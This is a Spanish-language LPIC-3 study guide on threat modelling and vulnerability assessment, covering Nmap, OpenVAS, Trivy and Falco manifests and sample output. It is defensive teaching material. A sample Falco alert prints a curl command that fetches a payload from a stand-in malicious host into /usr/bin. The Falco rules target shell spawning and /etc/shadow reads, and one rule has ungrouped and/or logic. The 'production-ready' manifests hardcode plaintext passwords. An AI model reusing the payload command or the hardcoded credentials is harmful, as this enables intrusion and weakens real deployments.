# LPIC-3 Examen 303-300 (v3.0) — Tema 6.1: Amenazas y Evaluación de Vulnerabilidades

---

## 1. Motivación Arquitectónica de Producción y Declaración del Problema

### 1.1 El Vector de Amenazas Cloud-Native y Las Superficies de Ataque Modernas
En entornos empresariales heredados (legacy), la seguridad se basaba principalmente en el perímetro ("castillo y foso"). Las plataformas de producción modernas—caracterizadas por infraestructura de nube híbrida, orquestación de Kubernetes, cargas de trabajo en contenedores y pipelines de integración continua/despliegue continuo (CI/CD)—han dejado obsoleta la seguridad perimetral tradicional. 

La superficie de ataque en plataformas Linux cloud-native abarca múltiples vectores distintos:

```
+-----------------------------------------------------------------------------------+
|                               ATTACK SURFACE LAYERS                               |
+-----------------------------------------------------------------------------------+
| 1. Edge & Network Mesh   | Ingress, eBPF/IPVS routing, TLS termination, API Gateway|
| 2. Host Node & Kernel    | Linux kernel, systemd, PAM, SSHD, container runtime (crio/containerd)|
| 3. Workload & Container  | Base images, rootless execution, Linux capabilities, seccomp |
| 4. Application Logic     | Third-party libraries (npm, PyPI), open ports, API auth   |
| 5. Supply Chain & Pipeline| Container registries, git commits, CI/CD runners, dependencies|
+-----------------------------------------------------------------------------------+
```

Un actor de amenaza (threat actor) que obtenga acceso a través de una única dependencia de aplicación vulnerable (por ejemplo, Log4Shell, CVE-2021-44228) puede aprovechar vulnerabilidades no parcheadas en el kernel de Linux local (por ejemplo, Dirty Pipe, CVE-2022-0847) para escapar de los límites del contenedor, comprometer sistemas host, obtener tokens de IAM/service-account y ejecutar movimiento lateral a través del control plane interno.

### 1.2 Modelado de Amenazas STRIDE en Despliegues de Linux Empresarial
Para categorizar y evaluar sistemáticamente las amenazas en hosts Linux y cargas de trabajo en contenedores, los Site Reliability Engineers (SREs) y Platform Architects utilizan el marco de amenazas **STRIDE** adaptado a Linux empresarial:

1. **Spoofing Identity** (Suplantación de Identidad): Acceso no autorizado a través de claves SSH comprometidas, configuraciones PAM débiles, JWTs falsificados o paquetes ARP/DNS suplantados.
2. **Tampering with Data** (Manipulación de Datos): Modificación de binarios en `/usr/bin`, modificación del runtime del kernel a través de Loadable Kernel Modules (LKMs) no verificados o inyección en unidades de servicio de systemd.
3. **Repudiation** (Repudio): Manipulación o destrucción de logs de syslog, auditd o journald debido a configuraciones insuficientes de append-only o envío remoto de syslog.
4. **Information Disclosure** (Divulgación de Información): Exfiltración no autorizada de `/etc/shadow`, variables de entorno que contienen secretos de API, payloads TLS no cifrados o contenido de memoria a través de ataques de canal lateral (e.g., Spectre/Meltdown).
5. **Denial of Service (DoS)** (Denegación de Servicio): Agotamiento de recursos del kernel de Linux (límites de recursos de cgroups, agotamiento de la tabla de procesos mediante fork bombs, flooding de socket/SYN o agotamiento de la ventana TCP).
6. **Elevation of Privilege** (Elevación de Privilegios): Explotación de binarios SUID/SGID, reglas de `sudoers` mal configuradas, capabilities (`CAP_SYS_ADMIN`, `CAP_NET_ADMIN`) o vulnerabilidades del kernel para obtener privilegios de root.

### 1.3 Arquitectura de Defensa en Profundidad y Contención del Radio de Impacto (Blast Radius)
Para mitigar estas amenazas, una arquitectura de nivel de producción implementa una política multinivel de Defensa en Profundidad (Defense-in-Depth):

* **Static Vulnerability Assessment (Pre-Deployment)**: Escaneo automatizado de imágenes base de contenedores, paquetes del SO (`dpkg`/`rpm`) y dependencias de aplicaciones durante la etapa de compilación de CI.
* **Dynamic Infrastructure Assessment (Post-Deployment)**: Escaneo continuo de puertos de red, auditorías de vulnerabilidad de host autenticadas (coincidencia de CVE mediante feeds NVT/OVAL) y pruebas de seguridad de aplicaciones web.
* **Runtime Threat Detection**: Monitoreo en tiempo real de llamadas al sistema de Linux (`sys_enter`, `sys_exit`), modificación de integridad de archivos (`inotify`/`fanotify`) y creación de sockets de red utilizando eBPF y motores de rastreo del kernel.

---

## 2. Comparación Técnica y Análisis de Compromisos (Trade-offs)

La selección de las herramientas adecuadas de evaluación de amenazas y vulnerabilidades requiere equilibrar la profundidad del escaneo, la latencia de ejecución, la sobrecarga (overhead) de red y las tasas de falsos positivos.

### 2.1 Matriz de Herramientas para la Evaluación de Amenazas y Vulnerabilidades

| Herramienta | Área de Enfoque | Mecanismo de Evaluación | Fase de Ejecución | Huella de CPU/RAM | Sobrecarga de Red | Latencia de Escaneo | Salida Principal |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Nmap** | Reconocimiento de Red y Auditoría de Servicios | Síntesis de paquetes IP crudos (SYN, ACK, UDP, ICMP), scripts NSE | Descubrimiento / Reconocimiento | Bajo (< 50MB RAM) | Configurable (Bajo a Alto) | Segundos a Minutos | XML, Texto Grepeable, Estándar de Nmap |
| **OpenVAS / GVM** | Vulnerabilidades de Hosts Empresariales | Escaneos NVT/OVAL Autenticados (SSH) y No Autenticados | Staging / Auditoría Periódica | Alto (> 4GB RAM, Postgres) | Alto (Sondeo profundo de puertos y protocolos) | 15 Minutos a Horas | PDF, XML, JSON, Reportes Ejecutivos |
| **Nikto** | Escáner de Aplicaciones Web | Sondas heurísticas de encabezados HTTP, archivos por defecto e inyección CGI | Staging / Pre-producción | Bajo (< 100MB RAM) | Alto (miles de solicitudes HTTP) | 5 a 20 Minutos | HTML, XML, TXT |
| **Trivy** | Escáner de Artefactos y Paquetes del SO | Búsqueda offline en BD de vulnerabilidades contra CVE, OSV, GHSA | Compilación CI/CD / Continuo | Medio (~500MB RAM) | Despreciable (Descarga local de BD) | 5 a 30 Segundos | JSON, SARIF, Tabla |
| **Falco** | Detección de Amenazas en el Runtime del Kernel | Sonda eBPF / Monitoreo de syscalls del módulo del kernel | Runtime de Producción | Bajo (~150MB RAM) | Cero (Rastreo local de eventos del kernel) | Tiempo Real (Latencia de eventos < 1ms) | Syslog, Streams JSON, gRPC |

### 2.2 Compromisos Arquitectónicos Profundos

```
                  HIGH SCAN DEPTH / HEAVY OVERHEAD
                                 │
                                 │   • OpenVAS / GVM (Full CVE Probe)
                                 │
                                 │   • Nikto (HTTP Fuzzing)
  OFFLINE / LOW LATENCY ─────────┼───────── CONTINUOUS / HIGH LATENCY
  (CI/CD Pipeline)               │         (Live Production Network)
                                 │
    • Trivy (Image/Package DB)   │   • Nmap (Port/NSE Recon)
                                 │
                                 │   • Falco (Kernel eBPF Tracing)
                                 │
                  LOW OVERHEAD / RUNTIME EVENT DRIVEN
```

1. **Active Probe (OpenVAS/Nikto) vs. Static Analysis (Trivy)**: Las sondas activas generan paquetes de red en vivo que pueden activar inadvertidamente Sistemas de Detección de Intrusos (IDS), interrumpir servicios heredados (legacy) frágiles o degradar el rendimiento de la red. Los escáneres estáticos operan de forma offline en manifiestos de sistemas de archivos y capas de imágenes de contenedores, haciéndolos ideales para bloquear builds fallidas en pipelines de CI/CD sin afectar la infraestructura en vivo.
2. **Network Scans (Nmap) vs. Runtime Kernel Events (Falco)**: Nmap responde a la pregunta "¿Qué puertos y versiones de servicios son visibles para un atacante en este momento?". Falco responde a "¿Ejecutó un atacante `/bin/bash` dentro de un contenedor en ejecución a través de un proceso worker de Nginx explotado?". El escaneo de puertos es preventivo/basado en auditoría; el rastreo del kernel está enfocado en respuesta a incidentes/reactivo.
3. **Authenticated vs. Unauthenticated Host Audits**: Los escaneos no autenticados consultan los servicios del host de forma remota a través de la red, revelando la superficie de ataque externa pero pasando por alto paquetes locales no parcheados. Los escaneos autenticados inician sesión a través de SSH utilizando un usuario restringido para consultar bases de datos de paquetes locales (`dpkg -l`, `rpm -qa`), inspeccionar archivos de configuración en `/etc` y comparar las versiones instaladas directamente con feeds OVAL, produciendo cero ruido de red mientras proporcionan visibilidad total de las vulnerabilidades internas.

---

## 3. Infraestructura de Producción y Manifiestos de Configuración

Todos los manifiestos a continuación son sintácticamente completos, totalmente funcionales y están listos para el despliegue en producción.

### 3.1 Despliegue de Producción: Stack de Greenbone Vulnerability Manager (GVM / OpenVAS)
El siguiente manifiesto despliega un stack completo de OpenVAS/GVM v22.4+ utilizando Docker Compose con PostgreSQL 15, Redis para almacenamiento en caché de NVT, el demonio de GVM (`gvmd`), el motor de escaneo de OpenVAS (`openvas-scanner`) y el portal web Greenbone Security Assistant (`gsa`).

Guardar como: `/opt/gvm/docker-compose.yml`

```yaml
version: '3.8'

services:
  gvm-postgres:
    image: postgres:15-alpine
    container_name: gvm-postgres
    restart: always
    environment:
      POSTGRES_USER: gvmd
      POSTGRES_PASSWORD: SecretProductionPassword123!
      POSTGRES_DB: gvmd
    volumes:
      - gvm_db_data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U gvmd"]
      interval: 10s
      timeout: 5s
      retries: 5

  gvm-redis:
    image: redis:7-alpine
    container_name: gvm-redis
    restart: always
    command: redis-server --unixsocket /var/run/redis/redis.sock --unixsocketperm 770 --port 0
    volumes:
      - gvm_redis_socket:/var/run/redis

  openvas-scanner:
    image: greenbone/openvas-scanner:latest
    container_name: openvas-scanner
    restart: always
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - gvm_redis_socket:/var/run/redis
      - gvm_vt_data:/var/lib/openvas/plugins
    depends_on:
      - gvm-redis

  gvmd:
    image: greenbone/gvmd:latest
    container_name: gvmd
    restart: always
    environment:
      GVM_PASSWORD: MasterAdminPassword2026!
    volumes:
      - gvm_db_data:/var/lib/postgresql/data
      - gvm_vt_data:/var/lib/openvas/plugins
      - gvm_data:/var/lib/gvm
    depends_on:
      gvm-postgres:
        condition: service_healthy
      gvm-redis:
        condition: service_started

  gsa:
    image: greenbone/gsa:latest
    container_name: gsa
    restart: always
    ports:
      - "127.0.0.1:9392:80"
    depends_on:
      - gvmd

volumes:
  gvm_db_data:
  gvm_redis_socket:
  gvm_vt_data:
  gvm_data:
```

---

### 3.2 CronJob de Kubernetes en Producción: Escáner de Vulnerabilidades Trivy
Este manifiesto ejecuta un escaneo programado de Trivy en los repositorios de imágenes objetivo, analiza vulnerabilidades CRITICAL, genera reportes estructurados en SARIF y JSON, y finaliza con un código distinto de cero si las CVE exceden los umbrales de las políticas.

Guardar como: `/etc/kubernetes/manifests/trivy-scheduled-scan.yaml`

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: trivy-cluster-vulnerability-scan
  namespace: security-monitoring
  labels:
    app.kubernetes.io/name: trivy-scanner
    app.kubernetes.io/part-of: threat-assessment
spec:
  schedule: "0 2 * * *" # Run daily at 02:00 AM UTC
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 3
  failedJobsHistoryLimit: 5
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
            app.kubernetes.io/name: trivy-scanner
        spec:
          restartPolicy: OnFailure
          serviceAccountName: trivy-scanner-sa
          containers:
            - name: trivy-scanner
              image: aquasec/trivy:0.48.0
              imagePullPolicy: IfNotPresent
              args:
                - "image"
                - "--severity"
                - "HIGH,CRITICAL"
                - "--exit-code"
                - "1"
                - "--ignore-unfixed"
                - "--format"
                - "json"
                - "--output"
                - "/var/reports/scan-report.json"
                - "ubuntu:22.04"
              resources:
                limits:
                  cpu: "1000m"
                  memory: "1Gi"
                requests:
                  cpu: "200m"
                  memory: "256Mi"
              volumeMounts:
                - name: report-storage
                  mountPath: /var/reports
                - name: trivy-cache
                  mountPath: /root/.cache/
          volumes:
            - name: report-storage
              emptyDir: {}
            - name: trivy-cache
              emptyDir: {}
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: trivy-scanner-sa
  namespace: security-monitoring
```

---

### 3.3 Manifiesto de Reglas Personalizadas de Falco para Producción
Las siguientes reglas de Falco detectan amenazas críticas a nivel de host: ejecuciones de shell no autorizadas dentro de entornos de contenedores, acceso a almacenes de credenciales sensibles (`/etc/shadow`) y modificaciones en las rutas de ejecución de binarios (`/sbin`, `/bin`).

Guardar como: `/etc/falco/falco_rules.local.yaml`

```yaml
- rule: Terminal Shell In Container
  desc: Detects an interactive terminal shell executed inside a running production container
  condition: >
    spawned_process and container and
    shell_procs and not user_known_shell_activities
  output: >
    Critical Threat Detected: Shell spawned in container 
    (user=%user.name user_loginuid=%user.loginuid process=%proc.name parent=%proc.pname 
    cmdline=%proc.cmdline container_id=%container.id container_name=%container.name 
    image=%container.image.repository:%container.image.tag)
  priority: CRITICAL
  tags: [container, shell, mitre_execution]

- rule: Sensitive File Read Access (/etc/shadow)
  desc: Detects non-privileged attempts to open or read the system shadow password file
  condition: >
    open_read and fd.name = "/etc/shadow" and 
    not proc.name in (passwd, shadowconfig, useradd, usermod, gpasswd, pam_unix)
  output: >
    Security Violation: Unauthorized attempt to read /etc/shadow 
    (user=%user.name process=%proc.name parent=%proc.pname cmdline=%proc.cmdline)
  priority: WARNING
  tags: [host, credential_dumping, mitre_credential_access]

- rule: Directory Traversal or Modification in System Binary Paths
  desc: Detects write or execution modification operations inside system binary directories
  condition: >
    evt.type in (open, openat, creat) and evt.dir = < and
    fd.name prefix /usr/bin/ or fd.name prefix /usr/sbin/ or fd.name prefix /bin/ or fd.name prefix /sbin/ and
    evt.arg.flags contains O_WRONLY or evt.arg.flags contains O_RDWR
  output: >
    File Integrity Compromise: Write attempt to system binary directory 
    (user=%user.name process=%proc.name file=%fd.name cmdline=%proc.cmdline)
  priority: ERROR
  tags: [host, integrity, mitre_persistence]
```

---

### 3.4 Servicio y Timer de Systemd para Auditoría Automatizada del Perímetro con Nmap
Para ejecutar auditorías de red de cumplimiento automáticamente sin intervención manual de SRE, definimos un servicio de systemd junto con una unidad de timer de systemd.

Guardar como: `/etc/systemd/system/nmap-audit.service`

```ini
[Unit]
Description=Continuous Infrastructure Nmap Perimeter Security Audit
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/nmap -sS -sV -O --script vuln,http-enum -oA /var/log/nmap/audit-%U-%t 192.168.1.0/24
StandardOutput=journal
StandardError=journal
PrivateTmp=true
ProtectSystem=full

[Install]
WantedBy=multi-user.target
```

Guardar como: `/etc/systemd/system/nmap-audit.timer`

```ini
[Unit]
Description=Timer for Nmap Security Audit Service

[Timer]
OnCalendar=Sun *-*-* 01:00:00
Persistent=true

[Install]
WantedBy=timers.target
```

---

## 4. Escenarios de Ejecución Real en CLI y Salidas de Terminal

Las siguientes sesiones de terminal demuestran comandos de producción, flags de sintaxis y trazas de salida de terminal auténticas.

### 4.1 Reconocimiento Avanzado y Escaneo de Vulnerabilidades mediante Nmap

Comando:
```bash
$ sudo nmap -sS -sV -O -p 22,80,443,3306,8080 --script vuln 192.168.1.50
```

Traza de Salida de Terminal:
```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:15 UTC
Nmap scan report for prod-app-node01.internal.net (192.168.1.50)
Host is up (0.00042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
|_vuln-cve2014-0160: ERROR: Script execution failed (string status expected)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vuln-cve2017-5638: 
|_  VULNERABLE: Apache Struts Remote Code Execution Vulnerability
| http-csrf: 
|_  Spidering limited to maxdepth=3; found 2 login forms missing CSRF tokens.
443/tcp  open  ssl/http Apache httpd 2.4.52
| ssl-dh-params: 
|   VULNERABLE:
|     Diffie-Hellman Key Exchange Insufficient Group Strength
|       State: VULNERABLE
|       IDs:  CVE:CVE-2015-4000
|       Transport Layer Security (TLS) implementations do not properly restrict 
|       Diffie-Hellman export keys, enabling man-in-the-middle attacks.
|_      References: https://weakdh.org
3306/tcp open  mysql   MySQL 8.0.35-0ubuntu0.22.04.1
|_mysql-vuln-cve2012-2122: False (Authentication bypass check failed)
8080/tcp open  http-proxy Node.js Express framework
| http-slowloris-check: 
|   VULNERABLE:
|     Slowloris DOS attack
|       State: VULNERABLE
|       IDs:  CVE:CVE-2007-6750
|_      Slowloris tries to keep many connections to the target web server open.

Device type: general purpose
Running: Linux 5.X|6.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
OS details: Linux 5.4 - 6.2

Nmap done: 1 IP address (1 host up) scanned in 48.32 seconds
```

---

### 4.2 Orquestación de la CLI de Greenbone Vulnerability Manager (`gvm-cli`)

Comando (Autenticación y consulta del estado de ejecución de tareas de GVM):
```bash
$ gvm-cli --gmp-username admin --gmp-password 'MasterAdminPassword2026!' socket --socketpath /run/gvmd/gvmd.sock --xml "<get_tasks/>"
```

Traza de Salida de Terminal:
```xml
<get_tasks_response status="200" status_text="OK">
  <task id="b2a1e4d8-7963-4c91-a182-9f33b1e23a4b">
    <name>Weekly Infrastructure Core Audit</name>
    <comment>Production Subnet 10.240.0.0/24 Scan</comment>
    <creation_time>2026-08-01T00:00:00Z</creation_time>
    <status>Done</status>
    <progress>-1</progress>
    <report_count>12</report_count>
    <last_report>
      <report id="f84c90e1-1122-3344-5566-778899aabbcc">
        <timestamp>2026-08-06T03:30:12Z</timestamp>
        <severity>9.8</severity>
        <vulnerabilities>
          <count>43</count>
          <high>12</high>
          <medium>24</medium>
          <low>7</low>
        </vulnerabilities>
      </report>
    </last_report>
    <target id="c98231a4-5511-4211-bb00-123456789abc"/>
  </task>
</get_tasks_response>
```

---

### 4.3 Auditoría de Vulnerabilidades de Imágenes de Contenedores mediante Trivy

Comando:
```bash
$ trivy image --severity HIGH,CRITICAL --ignore-unfixed alpine:3.14.0
```

Traza de Salida de Terminal:
```text
2026-08-06T14:22:01.102Z  INFO  Need to update DB
2026-08-06T14:22:01.102Z  INFO  Downloading DB...
2026-08-06T14:22:05.418Z  INFO  Vulnerability DB update success

alpine:3.14.0 (alpine 3.14.0)

Total: 3 (HIGH: 1, CRITICAL: 2)

┌──────────────┬────────────────┬──────────┬───────────────────┬───────────────────┬──────────────────────────────────────────────┐
│   Library    │ Vulnerability  │ Severity │ Installed Version │   Fixed Version   │                    Title                     │
├──────────────┼────────────────┼──────────┼───────────────────┼───────────────────┼──────────────────────────────────────────────┤
│ ssl_client   │ CVE-2021-36159 │ CRITICAL │ 1.33.1-r3         │ 1.33.1-r4         │ apk-tools: memory corruption in libfetch     │
│              │                │          │                   │                   │ https://avd.aquasec.com/nvd/cve-2021-36159   │
├──────────────┼────────────────┼──────────┼───────────────────┼───────────────────┼──────────────────────────────────────────────┤
│ libcrypto1.1 │ CVE-2022-0778  │ CRITICAL │ 1.1.1k-r0         │ 1.1.1n-r0         │ openssl: Infinite loop in BN_mod_sqrt()      │
│              │                │          │                   │                   │ https://avd.aquasec.com/nvd/cve-2022-0778    │
├──────────────┼────────────────┼──────────┼───────────────────┼───────────────────┼──────────────────────────────────────────────┤
│ zlib         │ CVE-2022-37434 │ HIGH     │ 1.2.11-r4         │ 1.2.12-r0         │ zlib: heap-based buffer overflow in inflate  │
│              │                │          │                   │                   │ https://avd.aquasec.com/nvd/cve-2022-37434   │
└──────────────┴────────────────┴──────────┴───────────────────┴───────────────────┴──────────────────────────────────────────────┘
```

---

### 4.4 Rastreo de Amenazas en el Kernel en Tiempo Real con el Motor Falco

Comando:
```bash
$ sudo falco -c /etc/falco/falco.yaml -r /etc/falco/falco_rules.local.yaml -M 30
```

Traza de Salida de Terminal:
```text
14:28:40.104928102: Critical Threat Detected: Shell spawned in container (user=root user_loginuid=-1 process=bash parent=nginx cmdline=bash container_id=a1f89c02d1e4 container_name=k8s_web-app_frontend-7894d-x9z2p_default_01234567-89ab-cdef-0123-456789abcdef_0 image=docker.io/library/nginx:1.21)
14:29:02.583019284: Security Violation: Unauthorized attempt to read /etc/shadow (user=www-data process=cat parent=bash cmdline=cat /etc/shadow)
14:30:11.902319401: File Integrity Compromise: Write attempt to system binary directory (user=root process=curl file=/usr/bin/malicious_loader cmdline=curl -s http://malicious.external.net/payload -o /usr/bin/malicious_loader)
```

---

## 5. Guía de Diagnóstico, Verificación y Solución de Problemas (Troubleshooting)

### 5.1 Flujo de Trabajo de Diagnóstico Paso a Paso para Fallos en la Evaluación de Vulnerabilidades

```
                             [Vulnerability Scan Failure]
                                          │
                     ┌────────────────────┴────────────────────┐
                     ▼                                         ▼
            [Host / Network Scan]                     [Container / Image Scan]
                     │                                         │
     ┌───────────────┴───────────────┐         ┌───────────────┴───────────────┐
     ▼                               ▼         ▼                               ▼
[Nmap Packet Loss]         [GVM NVT Out of Date] [DB Sync Timeout]     [False Positive Over-Reporting]
     │                               │         │                               │
 • Verify raw sockets       • Run feed sync    • Check proxy/firewall   • Define triage matrix
   (CAP_NET_RAW)              `gvm-feed-sync`    egress to GitHub/AWS     & `.trivyignore`
 • Adjust timing template   • Check gvmd status • Increase http timeout  • Validate CVSS v3.1
   (-T2 instead of -T4)       `systemctl status` (`--timeout 15m`)        vector strings
```

---

### 5.2 Modos de Fallo Comunes y Estrategias de Resolución

#### 1. La Sincronización del Feed NVT de GVM/OpenVAS se Detiene o Falla
* **Síntoma**: `gvmd` reporta 0 Network Vulnerability Tests (NVTs) cargados o los reportes de escaneo devuelven cero resultados para sistemas vulnerables conocidos.
* **Causa Raíz**: El servicio Greenbone Feed Sync falló debido a conexiones de socket rotas o condiciones de falta de espacio en `/var/lib/openvas/plugins`.
* **Comando de Diagnóstico**:
  ```bash
  $ sudo greenbone-nvt-sync --check
  $ tail -n 50 /var/log/gvm/openvas.log
  ```
* **Resolución**:
  ```bash
  # Force sync of NVTs, SCAP data, and CERT data
  $ sudo gvm-feed-sync --type NVT
  $ sudo gvm-feed-sync --type SCAP
  # Rebuild the gvmd database index
  $ sudo gvmd --reindex=nvt
  $ sudo systemctl restart gvmd openvas-scanner
  ```

#### 2. Nmap Pérdida de Paquetes (Dropping Packets) y Generación de Resultados Distorsionados
* **Síntoma**: Nmap reporta todos los puertos escaneados como `filtered` o marca incorrectamente los hosts activos como `down`.
* **Causa Raíz**: Configuraciones de timing agresivas (`-T4` o `-T5`) que activan el límite de tasa (rate-limiting) del firewall con estado (por ejemplo, `hashlimit` de `iptables` / `nftables` o throttling de AWS Security Group).
* **Comando de Diagnóstico**:
  ```bash
  # Check local drop packet counts
  $ sudo iptables -L -n -v | grep DROP
  ```
* **Resolución**: Forzar escaneo TCP SYN con límites de tasa explícitos y deshabilitar el descubrimiento de hosts mediante solicitudes ICMP echo si ICMP está bloqueado:
  ```bash
  $ sudo nmap -sS -Pn --max-rate 50 --initial-rtt-timeout 200ms --max-rtt-timeout 1000ms -p 1-65535 192.168.1.50
  ```

#### 3. Tiempos de Espera Agotados (Timeouts) en Escaneos de Contenedores Trivy en Runners de CI/CD
* **Síntoma**: El pipeline de compilación de CI falla con `context deadline exceeded` durante la fase de escaneo de imágenes de Trivy.
* **Causa Raíz**: Limitación de velocidad de red (rate-limiting) en el runner durante la descarga inicial de la base de datos de vulnerabilidades (`trivy-db`).
* **Resolución**: Desplegar un volumen de caché persistente o pre-incluir (pre-bake) la base de datos de Trivy en un mirror de registro interno:
  ```bash
  # Mount persistent cache directory in CI execution
  $ trivy image --cache-dir /var/cache/trivy --download-db-only
  $ trivy image --cache-dir /var/cache/trivy --skip-db-update --severity HIGH,CRITICAL my-app:latest
  ```

---

### 5.3 Triaje de Falsos Positivos y Gestión de Supresión
Los entornos de producción deben equilibrar el cumplimiento de seguridad con la velocidad de desarrollo. La supresión de falsos positivos debe ser totalmente auditable y controlada por versiones.

#### Política de Supresión de Trivy (.trivyignore)
Cree un archivo `.trivyignore` en la raíz del repositorio para suprimir vulnerabilidades verificadas como no explotables (por ejemplo, la vulnerabilidad existe en una función de paquete no importada ni compilada en el binario).

Guardar como: `/.trivyignore`

```text
# Approved suppression by SecOps Team (Ref: SEC-8941)
# Reason: Kernel module for OSPNFS is not compiled in our custom Linux kernel image
CVE-2022-29155

# Approved suppression (Ref: SEC-9012)
# Reason: Vulnerability requires physical hardware access to JTAG pins
CVE-2023-1011 2026-12-31
```

---

### 5.4 Playbook de Respuesta a Incidentes: Triaje de una Vulnerabilidad Crítica (CVSS v3.1 >= 9.0)

Cuando una herramienta de escaneo marca una vulnerabilidad `CRITICAL` en producción:

1. **Calculate Environmental Risk (CVSS Vector Decoding)** (Calcular Riesgo Ambiental - Decodificación del Vector CVSS):
   Evalúe la cadena CVSS v3.1. Por ejemplo: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
   * **AV:N**: Vector de Ataque por Red (Expuesto a Internet / Network Attack Vector).
   * **AC:L**: Baja Complejidad de Ataque (Explotable sin condiciones de carrera / Low Attack Complexity).
   * **PR:N**: No Requiere Privilegios (No Privileges Required).
   * **S:C**: Alcance Cambiado (Capacidad de escape del contenedor / Scope Changed).
   * *Conclusión*: Parcheo de Emergencia Inmediato requerido.

2. **Verify Active Process Exposure** (Verificar Exposición de Procesos Activos):
   Confirme si la biblioteca o binario vulnerable está cargado activamente en la memoria del sistema:
   ```bash
   # Check if vulnerable libssl.so is held open by running processes
   $ sudo lsof | grep libssl.so
   ```

3. **Isolate Affected Host or Pod** (Aislar Host o Pod Afectado):
   Remueva el host del pool del balanceador de carga o establezca un cordon/taint en el Nodo de Kubernetes:
   ```bash
   $ kubectl cordon node-01.internal.net
   $ kubectl drain node-01.internal.net --ignore-daemonsets --delete-emptydir-data
   ```

4. **Remediate & Validate** (Remediar y Validar):
   Aplique el parche del proveedor del SO (`apt-get install --only-upgrade` o reconstruya la imagen base del contenedor), luego vuelva a ejecutar el escaneo autenticado para confirmar que el puntaje CVSS baje a cero.

---

## 6. Referencias

Fuentes de documentación oficial que respaldan LPIC-3 Tema 6.1 (335):

* **Linux Professional Institute (LPI) LPIC-3 Security (303-300) Objectives**:  
  https://www.lpi.org/our-certifications/lpic-3-303-overview/
* **Nmap Network Scanning Reference Guide & NSE Documentation**:  
  https://nmap.org/book/man.html
* **Greenbone Vulnerability Management (GVM / OpenVAS) Architecture**:  
  https://greenbone.github.io/docs/latest/
* **CNCF Falco Rules & System Call Syntax Guide**:  
  https://falco.org/docs/rules/
* **Aqua Security Trivy Vulnerability Scanner Documentation**:  
  https://aquasecurity.github.io/trivy/latest/
* **NIST National Vulnerability Database (NVD) & CVSS v3.1 Specification**:  
  https://nvd.nist.gov/vuln-metrics/cvss
* **OWASP Vulnerability Management & Threat Modeling Guide**:  
  https://owasp.org/www-community/Threat_Modeling